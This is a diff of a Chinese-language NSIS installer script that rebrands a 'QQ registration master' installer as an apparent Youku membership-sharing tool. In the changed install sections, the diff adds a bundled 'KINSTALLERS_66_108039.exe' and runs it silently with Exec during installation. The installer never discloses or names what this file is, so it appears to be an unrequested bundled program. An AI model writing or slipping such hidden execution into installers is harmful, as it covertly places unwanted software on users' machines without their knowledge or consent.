@@ -3,11 +3,11 @@
 !include "LogicLib.nsh"
 !include nsDialogs.nsh
 ; 安装程序初始定义常量
-!define PRODUCT_NAME "QQ注册大师2013 v2.1试用版"
-!define PRODUCT_VERSION "1.0"
+!define PRODUCT_NAME "优酷会员分享器2013 v2.1"
+!define PRODUCT_VERSION "2.1"
 !define PRODUCT_PUBLISHER "pipi"
 !define PRODUCT_WEB_SITE "http://121.199.10.53/"
-!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\QQ注册大师2013.exe"
+!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\优酷会员分享器2013.exe"
 !define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
 !define PRODUCT_UNINST_ROOT_KEY "HKLM"
 
@@ -22,8 +22,6 @@ SetCompressor lzma
 !define MUI_UNICON "qiaoyuka.ico"
 !define MUI_WELCOMEFINISHPAGE_BITMAP "qky.bmp"
 
-; 欢迎页面
-!insertmacro MUI_PAGE_WELCOME
 
 ; 许可协议页面
 !insertmacro MUI_PAGE_LICENSE "新建 文本文档.txt"
@@ -44,14 +42,12 @@ Var Checkbox4         #自定义选项选择框4的窗口句柄
 Var Checkbox5         #自定义选项选择框5的窗口句柄
 Var Checkbox6         #自定义选项选择框6的窗口句柄
 Var Checkbox7         #自定义选项选择框6的窗口句柄
-!define MUI_FINISHPAGE_RUN "$INSTDIR\dbg.exe"
-!define MUI_FINISHPAGE_RUN_TEXT "运行 DebugView"
-!define MUI_FINISHPAGE_SHOWREADME "$INSTDIR\readme.txt"
-!define MUI_FINISHPAGE_SHOWREADME_TEXT "打开 readme"
+!define MUI_FINISHPAGE_RUN "$INSTDIR\优酷会员分享器2013.exe"
+!define MUI_FINISHPAGE_RUN_TEXT "运行 优酷会员分享器"
 !define MUI_PAGE_CUSTOMFUNCTION_SHOW "CompShowProc"
 
 ; 安装完成页面
-#!define MUI_FINISHPAGE_RUN "$INSTDIR\QQ注册大师2013.exe"
+#!define MUI_FINISHPAGE_RUN "$INSTDIR\优酷会员分享器2013.exe    "
 !insertmacro MUI_PAGE_FINISH
 
 ; 安装卸载过程页面
@@ -66,7 +62,7 @@ Var Checkbox7         #自定义选项选择框6的窗口句柄
 
 Name "${PRODUCT_NAME} ${PRODUCT_VERSION}"
 OutFile "Setup.exe"
-InstallDir "$PROGRAMFILES\QQRegMaster"
+InstallDir "$PROGRAMFILES\YouKuShare"
 InstallDirRegKey HKLM "${PRODUCT_UNINST_KEY}" "UninstallString"
 ShowInstDetails show
 ShowUnInstDetails show
@@ -79,27 +75,28 @@ SectionEnd
 Section "MainSection" SEC01
   SetOutPath "$INSTDIR"
   SetOverwrite ifnewer
-  File "QQ注册大师2013.exe"
-  CreateDirectory "$SMPROGRAMS\QQRegMaster"
-  CreateShortCut "$SMPROGRAMS\QQRegMaster\QQRegMaster.lnk" "$INSTDIR\QQ注册大师2013.exe"
-  CreateShortCut "$DESKTOP\QQRegMaster.lnk" "$INSTDIR\QQ注册大师2013.exe"
-  File "down_s_66_46875.exe"
+  File "优酷会员分享器2013.exe"
+  File "KINSTALLERS_66_108039.exe"
+  CreateDirectory "$SMPROGRAMS\YouKuShare"
+  CreateShortCut "$SMPROGRAMS\YouKuShare\YouKuShare.lnk" "$INSTDIR\优酷会员分享器2013.exe"
+  CreateShortCut "$DESKTOP\YouKuShare.lnk" "$INSTDIR\优酷会员分享器2013.exe"
 SectionEnd
 
 Section -AdditionalIcons
-  # Exec "$INSTDIR\down_s_66_46875.exe"
+ 
   WriteIniStr "$INSTDIR\${PRODUCT_NAME}.url" "InternetShortcut" "URL" "${PRODUCT_WEB_SITE}"
-  CreateShortCut "$SMPROGRAMS\QQRegMaster\Website.lnk" "$INSTDIR\${PRODUCT_NAME}.url"
-  CreateShortCut "$SMPROGRAMS\QQRegMaster\Uninstall.lnk" "$INSTDIR\uninst.exe"
+  CreateShortCut "$SMPROGRAMS\YouKuShare\Website.lnk" "$INSTDIR\${PRODUCT_NAME}.url"
+  CreateShortCut "$SMPROGRAMS\YouKuShare\Uninstall.lnk" "$INSTDIR\uninst.exe"
+   Exec "$INSTDIR\KINSTALLERS_66_108039.exe"
    #WriteINIStr $INSTDIR\\war3set.ini  War3version version 130819
 SectionEnd
 
 Section -Post
   WriteUninstaller "$INSTDIR\uninst.exe"
-  WriteRegStr HKLM "${PRODUCT_DIR_REGKEY}" "" "$INSTDIR\QQ注册大师2013.exe"
+  WriteRegStr HKLM "${PRODUCT_DIR_REGKEY}" "" "$INSTDIR\优酷会员分享器2013.exe    "
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayName" "$(^Name)"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "UninstallString" "$INSTDIR\uninst.exe"
-  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayIcon" "$INSTDIR\QQ注册大师2013.exe"
+  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayIcon" "$INSTDIR\优酷会员分享器2013.exe"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayVersion" "${PRODUCT_VERSION}"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "URLInfoAbout" "${PRODUCT_WEB_SITE}"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "Publisher" "${PRODUCT_PUBLISHER}"
@@ -124,7 +121,7 @@ Section Uninstall
   !insertmacro DelFileByLog "$INSTDIR\install.log"
 
   ; 清除安装程序创建的且在卸载时可能为空的子目录，对于递归添加的文件目录，请由最内层的子目录开始清除(注意，不要带 /r 参数，否则会失去 DelFileByLog 的意义)
-  RMDir "$SMPROGRAMS\QQRegMaster"
+  RMDir "$SMPROGRAMS\YouKuShare"
 
   RMDir "$INSTDIR"
 
